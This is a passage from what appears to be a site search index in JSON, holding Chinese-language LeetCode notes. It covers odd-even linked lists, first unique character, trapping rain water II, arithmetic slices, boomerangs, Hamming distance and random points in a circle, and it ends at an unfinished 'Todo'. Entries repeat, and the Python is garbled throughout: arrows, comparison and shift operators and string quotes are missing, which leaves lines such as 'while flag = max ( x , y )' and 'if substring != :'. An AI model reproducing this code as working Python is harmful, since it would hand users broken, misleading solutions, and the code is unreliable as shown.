10 11 Example 1: Input: 1- 2- 3- 4- 5- NULL Output: 1- 3- 5- 2- 4- NULL 1,3,5 \u662f\u539f\u5947\u6570\u8282\u70b9\uff0c2\uff0c4\u662f\u539f\u5076\u6570\u8282\u70b9 Example 2: Input: 2- 1- 3- 5- 6- 4- 7- NULL Output: 2- 3- 6- 7- 1- 5- 4- NULL \u60f3\u6cd5 \u633a\u7b80\u5355 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def oddEvenList ( self , head : ListNode ) - ListNode : odd_head = ListNode ( ODD ) p_odd = odd_head even_head = ListNode ( EVEN ) p_even = even_head p = head i = 1 while p : if i % 2 == 1 : p_odd . next = p p_odd = p_odd . next else : p_even . next = p p_even = p_even . next p = p . next i += 1 p_even . next = None p_odd . next = even_head . next return odd_head . next","title":"321 330"},{"location":"LeetCode/vol 3/321-330/#328","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u5bf9\u4e8e\u5355\u94fe\u8868\u7684\u6240\u6709\u8282\u70b9\u8fdb\u884c\u91cd\u65b0\u6392\u5217\uff0c\u53d8\u6210\u539f\u5148\u5728\u94fe\u8868\u6392\u5217\u4e3a\u5947\u6570\u7684\u5728\u524d\uff0c\u5076\u6570\u7684\u5728\u540e \u8981\u6c42 O(1)\u7684\u7a7a\u95f4\u590d\u6742\u5ea6 O(nodes)\u7684\u65f6\u95f4\u590d\u6742\u5ea6 1 2 3 4 5 6 7 8 9 10 11 Example 1: Input: 1- 2- 3- 4- 5- NULL Output: 1- 3- 5- 2- 4- NULL 1,3,5 \u662f\u539f\u5947\u6570\u8282\u70b9\uff0c2\uff0c4\u662f\u539f\u5076\u6570\u8282\u70b9 Example 2: Input: 2- 1- 3- 5- 6- 4- 7- NULL Output: 2- 3- 6- 7- 1- 5- 4- NULL \u60f3\u6cd5 \u633a\u7b80\u5355","title":"328"},{"location":"LeetCode/vol 3/321-330/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def oddEvenList ( self , head : ListNode ) - ListNode : odd_head = ListNode ( ODD ) p_odd = odd_head even_head = ListNode ( EVEN ) p_even = even_head p = head i = 1 while p : if i % 2 == 1 : p_odd . next = p p_odd = p_odd . next else : p_even . next = p p_even = p_even . next p = p . next i += 1 p_even . next = None p_odd . next = even_head . next return odd_head . next","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 3/381-390/","text":"387 \u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u627e\u5230\u5b83\u4e2d\u7684\u7b2c\u4e00\u4e2a\u975e\u91cd\u590d\u5b57\u7b26\u5e76\u8fd4\u56de\u5b83\u7684\u7d22\u5f15\u3002 \u5982\u679c\u5b83\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de-1\u3002 1 2 3 4 5 6 7 8 9 10 s = leetcode return 0. # l \u4e0d\u91cd\u590d # e \u91cd\u590d s = loveleetcode , return 2. # l \u91cd\u590d # o \u91cd\u590d # v \u4e0d\u91cd\u590d \u60f3\u6cd5 \u6ca1\u60f3\u6cd5\u66b4\u529b\u4e0a 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def firstUniqChar ( self , s ): :type s: str :rtype: int visit = [ 0 for i in range ( 26 )] for char in s : visit [ ord ( char ) - 97 ] += 1 for i in range ( len ( s )): if visit [ ord ( s [ i ]) - 97 ] == 1 : return i return - 1","title":"381 390"},{"location":"LeetCode/vol 3/381-390/#387","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u627e\u5230\u5b83\u4e2d\u7684\u7b2c\u4e00\u4e2a\u975e\u91cd\u590d\u5b57\u7b26\u5e76\u8fd4\u56de\u5b83\u7684\u7d22\u5f15\u3002 \u5982\u679c\u5b83\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de-1\u3002 1 2 3 4 5 6 7 8 9 10 s = leetcode return 0. # l \u4e0d\u91cd\u590d # e \u91cd\u590d s = loveleetcode , return 2. # l \u91cd\u590d # o \u91cd\u590d # v \u4e0d\u91cd\u590d \u60f3\u6cd5 \u6ca1\u60f3\u6cd5\u66b4\u529b\u4e0a 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def firstUniqChar ( self , s ): :type s: str :rtype: int visit = [ 0 for i in range ( 26 )] for char in s : visit [ ord ( char ) - 97 ] += 1 for i in range ( len ( s )): if visit [ ord ( s [ i ]) - 97 ] == 1 : return i return - 1","title":"387"},{"location":"LeetCode/vol 4/401-410/","text":"407 \u7ed9\u5b9am x n\u6b63\u6574\u6570\u77e9\u9635\uff0c\u8be5\u77e9\u9635\u8868\u793a2D\u9ad8\u7a0b\u56fe\u4e2d\u6bcf\u4e2a\u5355\u5143\u683c\u7684\u9ad8\u5ea6\uff0c\u8ba1\u7b97\u4e0b\u96e8\u540e\u5b83\u80fd\u591f\u6355\u83b7\u7684\u6c34\u91cf\u3002 1 2 3 4 5 6 7 8 Given the following 3x6 height map: [ [1,4,3,1,3,2], [3,2,1,3,2,4], [2,3,3,2,3,1] ] Return 4. \u60f3\u6cd5 \u6211\u5bfb\u601d\u9700\u8981DP\uff1f \u9996\u5148\uff0c\u5916\u56f4\u7684\u90a3\u4e00\u5708\u80af\u5b9a\u662f\u4e0d\u884c\u7684 \u5bf9\u4e8e\u6bcf\u4e00\u884c\uff0c\u5148\u4ece\u6700\u5c0f\u7684\u5f00\u59cb\uff0c\u770b\u770b\u56db\u8fb9\u6709\u6ca1\u6709\u6bd4\u4ed6\u5c0f\u7684\uff0c\u6709\u7684\u8bdd\u662f\u4e0d\u662f \u80fd\u9732\u51fa\uff08\u8fd9\u91cc\u6253\u4e2aflag\uff0c\u600e\u4e48\u5224\u65ad\u80fd\u4e0d\u80fd\u9732\u51fa\uff1f\uff09\uff1f\u4e0d\u80fd\u7684\u8bdd\u3002\u3002\u3002\u3002emmm \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Solution : def trapRainWater ( self , heightMap ): if not heightMap or not heightMap [ 0 ]: return 0 import heapq m , n = len ( heightMap ), len ( heightMap [ 0 ]) heap = [] visited = [[ 0 ] * n for _ in range ( m )] # Push all the block on the border into heap for i in range ( m ): for j in range ( n ): if i == 0 or j == 0 or i == m - 1 or j == n - 1 : heapq . heappush ( heap , ( heightMap [ i ][ j ], i , j )) visited [ i ][ j ] = 1 result = 0 while heap : height , i , j = heapq . heappop ( heap ) for x , y in (( i + 1 , j ), ( i - 1 , j ), ( i , j + 1 ), ( i , j - 1 )): if 0 = x m and 0 = y n and not visited [ x ][ y ]: result += max ( 0 , height - heightMap [ x ][ y ]) heapq . heappush ( heap , ( max ( heightMap [ x ][ y ], height ), x , y )) visited [ x ][ y ] = 1 return result \u53c2\u8003\u8d44\u6599 https://www.cnblogs.com/grandyang/p/5928987.html","title":"401 410"},{"location":"LeetCode/vol 4/401-410/#407","text":"\u7ed9\u5b9am x n\u6b63\u6574\u6570\u77e9\u9635\uff0c\u8be5\u77e9\u9635\u8868\u793a2D\u9ad8\u7a0b\u56fe\u4e2d\u6bcf\u4e2a\u5355\u5143\u683c\u7684\u9ad8\u5ea6\uff0c\u8ba1\u7b97\u4e0b\u96e8\u540e\u5b83\u80fd\u591f\u6355\u83b7\u7684\u6c34\u91cf\u3002 1 2 3 4 5 6 7 8 Given the following 3x6 height map: [ [1,4,3,1,3,2], [3,2,1,3,2,4], [2,3,3,2,3,1] ] Return 4. \u60f3\u6cd5 \u6211\u5bfb\u601d\u9700\u8981DP\uff1f \u9996\u5148\uff0c\u5916\u56f4\u7684\u90a3\u4e00\u5708\u80af\u5b9a\u662f\u4e0d\u884c\u7684 \u5bf9\u4e8e\u6bcf\u4e00\u884c\uff0c\u5148\u4ece\u6700\u5c0f\u7684\u5f00\u59cb\uff0c\u770b\u770b\u56db\u8fb9\u6709\u6ca1\u6709\u6bd4\u4ed6\u5c0f\u7684\uff0c\u6709\u7684\u8bdd\u662f\u4e0d\u662f \u80fd\u9732\u51fa\uff08\u8fd9\u91cc\u6253\u4e2aflag\uff0c\u600e\u4e48\u5224\u65ad\u80fd\u4e0d\u80fd\u9732\u51fa\uff1f\uff09\uff1f\u4e0d\u80fd\u7684\u8bdd\u3002\u3002\u3002\u3002emmm","title":"407"},{"location":"LeetCode/vol 4/401-410/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Solution : def trapRainWater ( self , heightMap ): if not heightMap or not heightMap [ 0 ]: return 0 import heapq m , n = len ( heightMap ), len ( heightMap [ 0 ]) heap = [] visited = [[ 0 ] * n for _ in range ( m )] # Push all the block on the border into heap for i in range ( m ): for j in range ( n ): if i == 0 or j == 0 or i == m - 1 or j == n - 1 : heapq . heappush ( heap , ( heightMap [ i ][ j ], i , j )) visited [ i ][ j ] = 1 result = 0 while heap : height , i , j = heapq . heappop ( heap ) for x , y in (( i + 1 , j ), ( i - 1 , j ), ( i , j + 1 ), ( i , j - 1 )): if 0 = x m and 0 = y n and not visited [ x ][ y ]: result += max ( 0 , height - heightMap [ x ][ y ]) heapq . heappush ( heap , ( max ( heightMap [ x ][ y ], height ), x , y )) visited [ x ][ y ] = 1 return result \u53c2\u8003\u8d44\u6599 https://www.cnblogs.com/grandyang/p/5928987.html","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 4/431-440/","text":"434 \u8ba1\u7b97\u5b57\u7b26\u4e32\u4e2d\u7684\u6bb5\u6570\uff0c\u5176\u4e2d\u6bb5\u5b9a\u4e49\u4e3a\u975e\u7a7a\u683c\u5b57\u7b26\u7684\u8fde\u7eed\u5e8f\u5217\u3002 \u8bf7\u6ce8\u610f\uff0c\u8be5\u5b57\u7b26\u4e32\u4e0d\u5305\u542b\u4efb\u4f55\u4e0d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u3002 1 2 Input: Hello, my name is John Output: 5 \u60f3\u6cd5 emmmm\uff1f\u8fd9\u662f\u60f3\u5e72\u5565\u3002\u3002\u3002\u3002 \u6cd5\u4e00 1 2 3 4 5 6 7 8 class Solution : def countSegments ( self , s : str ) - int : s = s . strip () res = 0 for substring in s . split (): if substring != : res += 1 return res","title":"431 440"},{"location":"LeetCode/vol 4/431-440/#434","text":"\u8ba1\u7b97\u5b57\u7b26\u4e32\u4e2d\u7684\u6bb5\u6570\uff0c\u5176\u4e2d\u6bb5\u5b9a\u4e49\u4e3a\u975e\u7a7a\u683c\u5b57\u7b26\u7684\u8fde\u7eed\u5e8f\u5217\u3002 \u8bf7\u6ce8\u610f\uff0c\u8be5\u5b57\u7b26\u4e32\u4e0d\u5305\u542b\u4efb\u4f55\u4e0d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u3002 1 2 Input: Hello, my name is John Output: 5 \u60f3\u6cd5 emmmm\uff1f\u8fd9\u662f\u60f3\u5e72\u5565\u3002\u3002\u3002\u3002","title":"434"},{"location":"LeetCode/vol 4/431-440/#_1","text":"1 2 3 4 5 6 7 8 class Solution : def countSegments ( self , s : str ) - int : s = s . strip () res = 0 for substring in s . split (): if substring != : res += 1 return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 4/441-450/","text":"446 \u7b97\u672f\u5e8f\u5217\u662f\u76f8\u90bb\u7684\u4e24\u4e2a\u6570\u7684\u5dee\u503c\u76f8\u7b49\uff0c\u5982\u4e0b 1 2 3 4 5 6 7 8 9 For example, these are arithmetic sequences: 1, 3, 5, 7, 9 7, 7, 7, 7 3, -1, -5, -9 The following sequence is not arithmetic. 1, 1, 2, 5, 7 \u7ed9\u5b9aN\u4e2a\u6570\u7ec4\u6210\u4e00\u4e2a\u5e8f\u5217\uff0c\u8be5\u5e8f\u5217\u7684\u7684\u5b50\u5e8f\u5217\u5207\u7247\u662f\u4efb\u4f55\u6574\u6570\u5e8f\u5217 P_0,P_1,\\dots P_k P_0,P_1,\\dots P_k \uff0c\u4f7f\u5f97 0 =P_0 P_1 P_2 \\dots P_k 0<=P_0 < P_1 <P_2 \\dots P_k k\u9700\u8981\u5927\u4e8e2 \u7ed9\u51fa\u6240\u7ed9\u5e8f\u5217\u7684\u6240\u6709\u7b97\u6570\u5e8f\u5217\u7684\u4e2a\u6570 \u6c42\u662f\u7b49\u5dee\u6570\u5217\u7684\u5b50\u5e8f\u5217\uff0c\u53ef\u4ee5\u8df3\u8fc7\u67d0\u4e9b\u6570\u5b57\uff0c\u4e0d\u4e00\u5b9a\u975e\u5f97\u8fde\u7eed 1 2 3 4 5 6 7 8 9 10 11 12 13 Input: [2, 4, 6, 8, 10] Output: 7 Explanation: All arithmetic subsequence slices are: [2,4,6] [4,6,8] [6,8,10] [2,4,6,8] [4,6,8,10] [2,4,6,8,10] [2,6,10] \u60f3\u6cd5 \u8ba1\u7b97\u5dee\u503c\uff1f\u7136\u540e\u904d\u5386\u5dee\u503c\u6570\u7ec4\uff0c\u5229\u7528\u5dee\u503c\u6570\u7ec4\u6765\u8ba1\u7b97\uff1f DP\u5417\uff1f \u5982\u679c\u662fDP\uff0c\u90a3\u4e48\u653e\u4ec0\u4e48\uff1f\u51e0\u7ef4\uff1f \u4e00\u7ef4\u7684\u8bdd\uff0cDP[i]\u4e3a\u5f53\u524d\u6570\u5b57\u4e3a\u7ed3\u5c3e\u7684\u7b49\u5dee\u6570\u5217\u7684\u603b\u6570\uff1f \u4e8c\u7ef4\u7684\u8bdd\uff0cDP[i][j]\u4e3ai\u5230j\u7684\u7b49\u5dee\u6570\u5217\u7684\u603b\u6570\uff1f \u5176\u4ed6 \u505a\u6cd5\u7684\u786e\u662fDP \u4f46\u662f\u5b58\u653e\u7684\u4e0d\u662f\u6570\uff0c\u662f\u5b57\u5178\uff1b\u7684\u786e\u662f\u4e8c\u7ef4\u7684\u601d\u60f3\uff0c\u4f46\u662f\u7531\u4e8e\u9700\u8981\u5b58\u653e\u5dee\u503c\u7684\u5173\u7cfb\uff0c\u4e0d\u80fd\u653e\u6570\u7ec4\uff08\u592a\u5c0f\u4e86\uff09\uff0c\u53ea\u80fd\u653e\u5b57\u5178\u6765\u5b58\u653e\u5dee\u503c \u5bf9\u4e8e\u5f53\u524d\u904d\u5386\u5230\u7684\u6570\u5b57\uff0c\u53c8\u4ece\u5f00\u5934\u904d\u5386\u5230\u5f53\u524d\u6570\u5b57\uff0c\u8ba1\u7b97\u4e24\u4e2a\u6570\u5b57\u4e4b\u5deediff\uff0c\u5982\u679c\u8d8a\u754c\u4e86\u4e0d\u505a\u4efb\u4f55\u5904\u7406\uff0c\u5982\u679c\u6ca1\u8d8a\u754c \u8ba9dp[i]\u4e2ddiff\u7684\u5dee\u503c\u6620\u5c04\u81ea\u589e1 \u56e0\u4e3a\u6b64\u65f6A[i]\u524d\u9762\u6709\u76f8\u5dee\u4e3adiff\u7684A[j]\uff0c\u6240\u4ee5\u6620\u5c04\u503c\u8981\u52a01 \u770bdp[j]\u4e2d\u662f\u5426\u6709diff\u7684\u6620\u5c04\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u8bf4\u660e\u6b64\u65f6\u76f8\u5dee\u4e3adiff\u7684\u6570\u5b57\u81f3\u5c11\u6709\u4e09\u4e2a\u4e86\uff0c\u5df2\u7ecf\u80fd\u6784\u6210\u9898\u76ee\u8981\u6c42\u7684\u7b49\u5dee\u6570\u5217\u4e86\uff0c\u5c06dp[j][diff]\u52a0\u5165\u7ed3\u679crt\u4e2d\uff0c\u7136\u540e\u518d\u66f4\u65b0dp[i][diff] \u8fd9\u6837\u7b49\u904d\u5386\u5b8c\u6570\u7ec4\uff0cres\u5373\u4e3a\u6240\u6c42\u3002 dp[i][diff]\u4e3a \u5f53\u524d\u6570\u5b57A[i]\u4e0b\uff0c\u4e0b\u6807\u5c0f\u4e8ei\u7684\u6570\u7ec4\u4e2d \u5dee\u503c \u76f8\u540c\u7684\u6570\u7684\u6570\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def numberOfArithmeticSlices ( self , A : List [ int ]) - int : total = 0 dp = [{} for i in A ] for i in range ( len ( A )): for j in range ( i ): diff = A [ i ] - A [ j ] if diff not in dp [ i ]: dp [ i ][ diff ] = 0 dp [ i ][ diff ] += 1 if diff in dp [ j ]: dp [ i ][ diff ] += dp [ j ][ diff ] total += dp [ j ][ diff ] return total 447 \u7ed9\u5b9a\u5e73\u9762\u4e2d\u7684n\u4e2a\u70b9\u90fd\u662f\u6210\u5bf9\u4e0d\u540c\u7684\uff0c\u201c\u56de\u65cb\u9556\u201d\u662f\u70b9\uff08i\uff0cj\uff0ck\uff09\u7684\u5143\u7ec4\uff0c\u4f7f\u5f97i\u548cj\u4e4b\u95f4\u7684\u8ddd\u79bb\u7b49\u4e8ei\u548ck\u4e4b\u95f4\u7684\u8ddd\u79bb\uff08\u5143\u7ec4\u7684\u987a\u5e8f\u5f88\u91cd\u8981\uff09 \u8f93\u51fa\u603b\u6570 1 2 3 4 5 6 7 8 Input: [[0,0],[1,0],[2,0]] Output: 2 Explanation: The two boomerangs are [[1,0],[0,0],[2,0]] and [[1,0],[2,0],[0,0]] \u60f3\u6cd5 \u611f\u89c9\u9700\u8981\u4f7f\u7528\u52a8\u6001\u89c4\u5212\uff1f \u6216\u8005\u4f7f\u7528map\uff1f \u8bd5\u8bd5map \u8ddd\u79bb\u76f8\u7b49\u7684\u8ddd\u79bb\u653e\u5165\u4e00\u4e2a\u8868\uff0c\u6700\u540e\u7528 A_N^(N-1) A_N^(N-1) \u6765\u8ba1\u7b97\uff0c\u7d2f\u52a0\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution ( object ): def numberOfBoomerangs ( self , points ): :type points: List[List[int]] :rtype: int res = 0 for i in range ( len ( points )): distances_map = {} for j in range ( len ( points )): if j == i : continue x = points [ i ][ 0 ] - points [ j ][ 0 ] y = points [ i ][ 1 ] - points [ j ][ 1 ] distance = x ** 2 + y ** 2 distances_map [ distance ] = 1 + distances_map . get ( distance , 0 ) for k in distances_map : # A^(k-1)_k res += distances_map [ k ] * ( distances_map [ k ] - 1 ) return res","title":"441 450"},{"location":"LeetCode/vol 4/441-450/#446","text":"\u7b97\u672f\u5e8f\u5217\u662f\u76f8\u90bb\u7684\u4e24\u4e2a\u6570\u7684\u5dee\u503c\u76f8\u7b49\uff0c\u5982\u4e0b 1 2 3 4 5 6 7 8 9 For example, these are arithmetic sequences: 1, 3, 5, 7, 9 7, 7, 7, 7 3, -1, -5, -9 The following sequence is not arithmetic. 1, 1, 2, 5, 7 \u7ed9\u5b9aN\u4e2a\u6570\u7ec4\u6210\u4e00\u4e2a\u5e8f\u5217\uff0c\u8be5\u5e8f\u5217\u7684\u7684\u5b50\u5e8f\u5217\u5207\u7247\u662f\u4efb\u4f55\u6574\u6570\u5e8f\u5217 P_0,P_1,\\dots P_k P_0,P_1,\\dots P_k \uff0c\u4f7f\u5f97 0 =P_0 P_1 P_2 \\dots P_k 0<=P_0 < P_1 <P_2 \\dots P_k k\u9700\u8981\u5927\u4e8e2 \u7ed9\u51fa\u6240\u7ed9\u5e8f\u5217\u7684\u6240\u6709\u7b97\u6570\u5e8f\u5217\u7684\u4e2a\u6570 \u6c42\u662f\u7b49\u5dee\u6570\u5217\u7684\u5b50\u5e8f\u5217\uff0c\u53ef\u4ee5\u8df3\u8fc7\u67d0\u4e9b\u6570\u5b57\uff0c\u4e0d\u4e00\u5b9a\u975e\u5f97\u8fde\u7eed 1 2 3 4 5 6 7 8 9 10 11 12 13 Input: [2, 4, 6, 8, 10] Output: 7 Explanation: All arithmetic subsequence slices are: [2,4,6] [4,6,8] [6,8,10] [2,4,6,8] [4,6,8,10] [2,4,6,8,10] [2,6,10] \u60f3\u6cd5 \u8ba1\u7b97\u5dee\u503c\uff1f\u7136\u540e\u904d\u5386\u5dee\u503c\u6570\u7ec4\uff0c\u5229\u7528\u5dee\u503c\u6570\u7ec4\u6765\u8ba1\u7b97\uff1f DP\u5417\uff1f \u5982\u679c\u662fDP\uff0c\u90a3\u4e48\u653e\u4ec0\u4e48\uff1f\u51e0\u7ef4\uff1f \u4e00\u7ef4\u7684\u8bdd\uff0cDP[i]\u4e3a\u5f53\u524d\u6570\u5b57\u4e3a\u7ed3\u5c3e\u7684\u7b49\u5dee\u6570\u5217\u7684\u603b\u6570\uff1f \u4e8c\u7ef4\u7684\u8bdd\uff0cDP[i][j]\u4e3ai\u5230j\u7684\u7b49\u5dee\u6570\u5217\u7684\u603b\u6570\uff1f","title":"446"},{"location":"LeetCode/vol 4/441-450/#_1","text":"\u505a\u6cd5\u7684\u786e\u662fDP \u4f46\u662f\u5b58\u653e\u7684\u4e0d\u662f\u6570\uff0c\u662f\u5b57\u5178\uff1b\u7684\u786e\u662f\u4e8c\u7ef4\u7684\u601d\u60f3\uff0c\u4f46\u662f\u7531\u4e8e\u9700\u8981\u5b58\u653e\u5dee\u503c\u7684\u5173\u7cfb\uff0c\u4e0d\u80fd\u653e\u6570\u7ec4\uff08\u592a\u5c0f\u4e86\uff09\uff0c\u53ea\u80fd\u653e\u5b57\u5178\u6765\u5b58\u653e\u5dee\u503c \u5bf9\u4e8e\u5f53\u524d\u904d\u5386\u5230\u7684\u6570\u5b57\uff0c\u53c8\u4ece\u5f00\u5934\u904d\u5386\u5230\u5f53\u524d\u6570\u5b57\uff0c\u8ba1\u7b97\u4e24\u4e2a\u6570\u5b57\u4e4b\u5deediff\uff0c\u5982\u679c\u8d8a\u754c\u4e86\u4e0d\u505a\u4efb\u4f55\u5904\u7406\uff0c\u5982\u679c\u6ca1\u8d8a\u754c \u8ba9dp[i]\u4e2ddiff\u7684\u5dee\u503c\u6620\u5c04\u81ea\u589e1 \u56e0\u4e3a\u6b64\u65f6A[i]\u524d\u9762\u6709\u76f8\u5dee\u4e3adiff\u7684A[j]\uff0c\u6240\u4ee5\u6620\u5c04\u503c\u8981\u52a01 \u770bdp[j]\u4e2d\u662f\u5426\u6709diff\u7684\u6620\u5c04\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u8bf4\u660e\u6b64\u65f6\u76f8\u5dee\u4e3adiff\u7684\u6570\u5b57\u81f3\u5c11\u6709\u4e09\u4e2a\u4e86\uff0c\u5df2\u7ecf\u80fd\u6784\u6210\u9898\u76ee\u8981\u6c42\u7684\u7b49\u5dee\u6570\u5217\u4e86\uff0c\u5c06dp[j][diff]\u52a0\u5165\u7ed3\u679crt\u4e2d\uff0c\u7136\u540e\u518d\u66f4\u65b0dp[i][diff] \u8fd9\u6837\u7b49\u904d\u5386\u5b8c\u6570\u7ec4\uff0cres\u5373\u4e3a\u6240\u6c42\u3002 dp[i][diff]\u4e3a \u5f53\u524d\u6570\u5b57A[i]\u4e0b\uff0c\u4e0b\u6807\u5c0f\u4e8ei\u7684\u6570\u7ec4\u4e2d \u5dee\u503c \u76f8\u540c\u7684\u6570\u7684\u6570\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def numberOfArithmeticSlices ( self , A : List [ int ]) - int : total = 0 dp = [{} for i in A ] for i in range ( len ( A )): for j in range ( i ): diff = A [ i ] - A [ j ] if diff not in dp [ i ]: dp [ i ][ diff ] = 0 dp [ i ][ diff ] += 1 if diff in dp [ j ]: dp [ i ][ diff ] += dp [ j ][ diff ] total += dp [ j ][ diff ] return total","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 4/441-450/#447","text":"\u7ed9\u5b9a\u5e73\u9762\u4e2d\u7684n\u4e2a\u70b9\u90fd\u662f\u6210\u5bf9\u4e0d\u540c\u7684\uff0c\u201c\u56de\u65cb\u9556\u201d\u662f\u70b9\uff08i\uff0cj\uff0ck\uff09\u7684\u5143\u7ec4\uff0c\u4f7f\u5f97i\u548cj\u4e4b\u95f4\u7684\u8ddd\u79bb\u7b49\u4e8ei\u548ck\u4e4b\u95f4\u7684\u8ddd\u79bb\uff08\u5143\u7ec4\u7684\u987a\u5e8f\u5f88\u91cd\u8981\uff09 \u8f93\u51fa\u603b\u6570 1 2 3 4 5 6 7 8 Input: [[0,0],[1,0],[2,0]] Output: 2 Explanation: The two boomerangs are [[1,0],[0,0],[2,0]] and [[1,0],[2,0],[0,0]] \u60f3\u6cd5 \u611f\u89c9\u9700\u8981\u4f7f\u7528\u52a8\u6001\u89c4\u5212\uff1f \u6216\u8005\u4f7f\u7528map\uff1f \u8bd5\u8bd5map \u8ddd\u79bb\u76f8\u7b49\u7684\u8ddd\u79bb\u653e\u5165\u4e00\u4e2a\u8868\uff0c\u6700\u540e\u7528 A_N^(N-1) A_N^(N-1) \u6765\u8ba1\u7b97\uff0c\u7d2f\u52a0\uff1f","title":"447"},{"location":"LeetCode/vol 4/441-450/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution ( object ): def numberOfBoomerangs ( self , points ): :type points: List[List[int]] :rtype: int res = 0 for i in range ( len ( points )): distances_map = {} for j in range ( len ( points )): if j == i : continue x = points [ i ][ 0 ] - points [ j ][ 0 ] y = points [ i ][ 1 ] - points [ j ][ 1 ] distance = x ** 2 + y ** 2 distances_map [ distance ] = 1 + distances_map . get ( distance , 0 ) for k in distances_map : # A^(k-1)_k res += distances_map [ k ] * ( distances_map [ k ] - 1 ) return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 4/461-470/","text":"461 \u4e24\u4e2a\u6574\u6570\u4e4b\u95f4\u7684\u6c49\u660e\u8ddd\u79bb\u662f\u76f8\u5e94\u4f4d\u4e0d\u540c\u7684\u4f4d\u7f6e\u6570\u3002 \u7ed9\u5b9a\u4e24\u4e2a\u6574\u6570x\u548cy\uff0c\u8ba1\u7b97\u6c49\u660e\u8ddd\u79bb\u3002 1 2 3 4 5 6 7 8 9 10 Input: x = 1, y = 4 Output: 2 Explanation: 1 (0 0 0 1) 4 (0 1 0 0) \u2191 \u2191 The above arrows point to positions where the corresponding bits are different. \u60f3\u6cd5 \u4f30\u8ba1\u662f\u79fb\u4f4d\u64cd\u4f5c\uff0c\u6216\u8005\u5f02\u6216\uff1f \u5f02\u6216\u540e\u65701\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 class Solution : def hammingDistance ( self , x : int , y : int ) - int : xor = x ^ y flag = 1 count = 0 while flag = max ( x , y ): if flag xor : count += 1 flag = flag 1 return count","title":"461 470"},{"location":"LeetCode/vol 4/461-470/#461","text":"\u4e24\u4e2a\u6574\u6570\u4e4b\u95f4\u7684\u6c49\u660e\u8ddd\u79bb\u662f\u76f8\u5e94\u4f4d\u4e0d\u540c\u7684\u4f4d\u7f6e\u6570\u3002 \u7ed9\u5b9a\u4e24\u4e2a\u6574\u6570x\u548cy\uff0c\u8ba1\u7b97\u6c49\u660e\u8ddd\u79bb\u3002 1 2 3 4 5 6 7 8 9 10 Input: x = 1, y = 4 Output: 2 Explanation: 1 (0 0 0 1) 4 (0 1 0 0) \u2191 \u2191 The above arrows point to positions where the corresponding bits are different. \u60f3\u6cd5 \u4f30\u8ba1\u662f\u79fb\u4f4d\u64cd\u4f5c\uff0c\u6216\u8005\u5f02\u6216\uff1f \u5f02\u6216\u540e\u65701\uff1f","title":"461"},{"location":"LeetCode/vol 4/461-470/#_1","text":"1 2 3 4 5 6 7 8 9 10 class Solution : def hammingDistance ( self , x : int , y : int ) - int : xor = x ^ y flag = 1 count = 0 while flag = max ( x , y ): if flag xor : count += 1 flag = flag 1 return count","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 4/471-480/","text":"478 \u7ed9\u5b9a\u534a\u5f84\u548c\u5706\u5fc3(x,y)\uff0c\u5b8c\u6210\u4e00\u4e2a\u51fd\u6570 randPoint \uff0c\u8be5\u51fd\u6570\u5728\u5706\u5185\u751f\u6210\u4e00\u4e2a\u5355\u72ec\u7684\u968f\u673a\u70b9 \u6ce8\u610f \u8f93\u5165\u548c\u8f93\u51fa\u90fd\u662f\u6d6e\u70b9\u6570 \u534a\u5f84\u548c\u5706\u5fc3\u70b9(x,y)\u4f20\u5165\u7c7b\u7684\u6784\u9020\u51fd\u6570 \u5706\u5468\u4e0a\u7684\u70b9\u662f\u5728\u5706\u5468 \u8fd4\u56de\u4e00\u4e2a\u957f\u5ea6\u4e3a2\u7684\u6570\u7ec4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Example 1: Input: [ Solution , randPoint , randPoint , randPoint ] [[1,0,0],[],[],[]] Output: [null,[-0.72939,-0.65505],[-0.78502,-0.28626],[-0.83119,-0.19803]] Example 2: Input: [ Solution , randPoint , randPoint , randPoint ] [[10,5,-7.5],[],[],[]] Output: [null,[11.52438,-8.33273],[2.46992,-16.21705],[11.13430,-12.42337]] \u60f3\u6cd5 emmm\uff0c\u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a\u968f\u673a\u7b97\u6cd5\uff1f \u5148\u5728x\u4e0a\u968f\u673a\uff1f\u7136\u540e\u8ba1\u7b97y\u503c\uff1f\u5728\u8fd9\u4e0a\u9762\u968f\u673a\uff1f \u8bd5\u8bd5\uff1f \\pm y_0 =\\pm \\sqrt{r^2 - x_0^2},x_0=random(x-r,x+r) \\pm y_0 =\\pm \\sqrt{r^2 - x_0^2},x_0=random(x-r,x+r) \u8fd9\u6837\uff1f \u6211\u89c9\u5f97\u4e0d\u884c\u3002\u3002\u3002\uff08\u4e0d\u884c\u539f\u56e0\u662f\u96be\u5ea6\uff0c\u89c9\u5f97\u6ca1\u8fd9\u4e48\u7b80\u5355\uff09 Todo 